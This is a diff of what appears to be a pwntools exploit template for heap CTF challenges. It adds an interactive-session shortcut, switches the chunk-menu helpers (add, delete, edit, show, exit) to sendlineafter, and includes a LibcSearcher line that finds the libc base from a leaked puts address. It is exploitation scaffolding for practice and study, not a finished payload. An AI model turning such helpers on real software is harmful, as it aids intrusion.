@@ -2,6 +2,7 @@
 lambda:
 ```python
 #-----------------------------------------------------------------------------------------
+it      = lambda                    :p.interactive()
 sd      = lambda data               :p.send((data))
 sa     	= lambda delim,data         :p.sendafter((delim), (data))
 sl      = lambda data               :p.sendline((data))
@@ -69,26 +70,26 @@ u64Leakbase = lambda offset         :u64(ru(b"\x7f")[-6:].ljust(8, b"\x00")) - o
 #-----------------------------------------------------------------------------------------
 
 def add_chunk(index, size):
-    sa(b"choice:\n", b"1")
-    sa(b"index:\n", str(index).encode())
-    sa(b"size:\n", str(size).encode())
+    sla(b"choice:\n", b"1")
+    sla(b"index:\n", str(index).encode())
+    sla(b"size:\n", str(size).encode())
 
 def delete_chunk(index):
-    sa(b"choice:\n", b"2")
-    sa(b"index:\n", str(index).encode())
+    sla(b"choice:\n", b"2")
+    sla(b"index:\n", str(index).encode())
 
 def edit_chunk(index, content):
-    sa(b"choice:\n", b"3")
-    sa(b"index:\n", str(index).encode())
-    sa(b"length:\n", str(len(content)).encode())
+    sla(b"choice:\n", b"3")
+    sla(b"index:\n", str(index).encode())
+    sla(b"length:\n", str(len(content)).encode())
     sa(b"content:\n", content)
 
 def show_chunk(index):
-    sa(b"choice:\n", b"4")
-    sa(b"index:\n", str(index).encode())
+    sla(b"choice:\n", b"4")
+    sla(b"index:\n", str(index).encode())
 
 def exit_p():
-    sa(b"choice:\n", b"5")
+    sla(b"choice:\n", b"5")
 
 # use LibcSearcher get libc base addr
 libc = LibcSearcher("puts", puts_addr)
